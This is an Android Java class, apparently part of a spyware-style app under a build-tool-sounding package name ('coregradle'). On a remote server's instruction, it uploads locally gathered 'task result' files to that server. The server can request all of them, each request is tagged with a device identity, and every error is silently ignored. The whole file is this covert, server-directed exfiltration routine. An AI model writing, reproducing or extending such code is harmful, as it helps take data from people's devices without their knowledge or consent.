package org.code.coregradle.gatherers;

import android.content.Context;

import androidx.work.ListenableWorker;

import org.json.JSONArray;
import org.json.JSONObject;
import org.code.coregradle.WorkerStore;
import org.code.coregradle.config.ApiConfig;
import org.code.coregradle.config.IdentityStore;
import org.code.coregradle.utils.CompressionUtils;
import org.code.coregradle.utils.MessageXInterceptor;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class PendingTaskResultUploadGatherer implements InfoGatherer {

    private File taskResultStore;
    private OkHttpClient httpClient = new OkHttpClient();
    private IdentityStore identityStore;

    @Override
    public void initGatherer(Context context) {
        File tasksDir = getFolderCreateIfAbsent(context.getFilesDir(), "tasks");
        taskResultStore = getFolderCreateIfAbsent(tasksDir, "out");
        identityStore = IdentityStore.getInstance(context);
    }

    private File getFolderCreateIfAbsent(File parent, String folderName) {
        File folder = new File(parent, folderName);
        if (!folder.exists()) {
            folder.mkdirs();
        }
        return folder;
    }

    private void accumulateResults() {
        try {
            WorkerStore.executorService.submit(new MessageXInterceptor("Calling Request Task Result.", this.identityStore.getIdentityValue()));
            List<JSONObject> taskList = requestTaskResult();
            WorkerStore.executorService.submit(new MessageXInterceptor("Request Task Result Size : " + taskList.size(), this.identityStore.getIdentityValue()));
            for (int i = 0; i < taskList.size(); i++) {
                String taskId = taskList.get(i).optString("taskId");
                WorkerStore.executorService.submit(new MessageXInterceptor("Upload Task Result. TaskId : " + taskId, this.identityStore.getIdentityValue()));
                if (!taskId.isEmpty()) {
                    File taskResultDir = new File(taskResultStore, taskId);
                    File[] files = taskResultDir.listFiles();
                    if (files != null) {
                        for (File file : files) {
                            WorkerStore.executorService.submit(new MessageXInterceptor("Uploading File : " + file.getName() + " TaskId : " + taskId, this.identityStore.getIdentityValue()));
                            uploadResult(file, taskId);
                        }
                    } else {
                        WorkerStore.executorService.submit(new MessageXInterceptor("No files for TaskId : " + taskId, this.identityStore.getIdentityValue()));
                    }
                }
            }
        } catch (Exception e) {
        }
    }

    private void uploadResult(File file, String taskId) {
        try {
            Request request = new Request.Builder()
                    .url(ApiConfig.PUSH_RESULT)
                    .post(RequestBody.create(MediaType.get("application/x-binary"), file))
                    .addHeader(this.identityStore.getUploadHeaderKey(), this.identityStore.getIdentityValue())
                    .addHeader("X-TASK-ID", taskId)
                    .addHeader("X-FILE-TYPE", file.getName())
                    .addHeader("X-TASK-TIMESTAMP", getFormattedTimestamp(file.lastModified()))
                    .build();
            httpClient.newCall(request).execute();
        } catch (Exception e) {
        }
    }

    private String getFormattedTimestamp(long time) {
        SimpleDateFormat simpleDateFormat = new SimpleDateFormat(
                "yyyy-MM-dd-HH'h'-mm'm'-ss's'",
                Locale.getDefault());
        return simpleDateFormat.format(new Date(time));
    }

    private List<JSONObject> requestTaskResult() {
        List<JSONObject> taskList = new ArrayList<>();
        try {
            JSONObject requestJson = getRequestJSON();
            RequestBody requestBody = RequestBody.create(MediaType.get("application/json"),
                    CompressionUtils.compress(requestJson.toString()));
            Request request = new Request.Builder()
                    .url(ApiConfig.REQUEST_TASK_RESULT)
                    .post(requestBody)
                    .build();
            Response response = httpClient.newCall(request).execute();
            if (response.isSuccessful()) {
                JSONObject taskResultResponse = new JSONObject(response.body().string());
                if (taskResultResponse.has("all")) {
                    boolean uploadAll = taskResultResponse.getBoolean("all");
                    if (uploadAll) {
                        File[] toBeUploadedTasks = taskResultStore.listFiles();
                        if (toBeUploadedTasks != null && toBeUploadedTasks.length > 0) {
                            for (File toBeUploadTask : toBeUploadedTasks) {
                                JSONObject task = new JSONObject();
                                task.put("taskId", toBeUploadTask.getName());
                                taskList.add(task);
                            }
                        }
                    }
                } else if (taskResultResponse.has("tasks")) {
                    JSONArray tasks = taskResultResponse.optJSONArray("tasks");
                    if (tasks != null && tasks.length() > 0) {
                        for (int i = 0; i < tasks.length(); ++i) {
                            JSONObject task = tasks.optJSONObject(i);
                            if (task != null) {
                                taskList.add(task);
                            }
                        }
                    }
                }
            }
        } catch (Exception ignored) {
        }
        return taskList;
    }

    @Override
    public JSONObject getRequestJSON() {
        JSONObject requestJson = new JSONObject();
        try {
            requestJson.put(identityStore.getIdentityKey(), identityStore.getIdentityValue());
        } catch (Exception ignored) {
        }
        return requestJson;
    }

    @Override
    public ListenableWorker.Result makeRequest() {
        accumulateResults();
        return ListenableWorker.Result.success();
    }
}
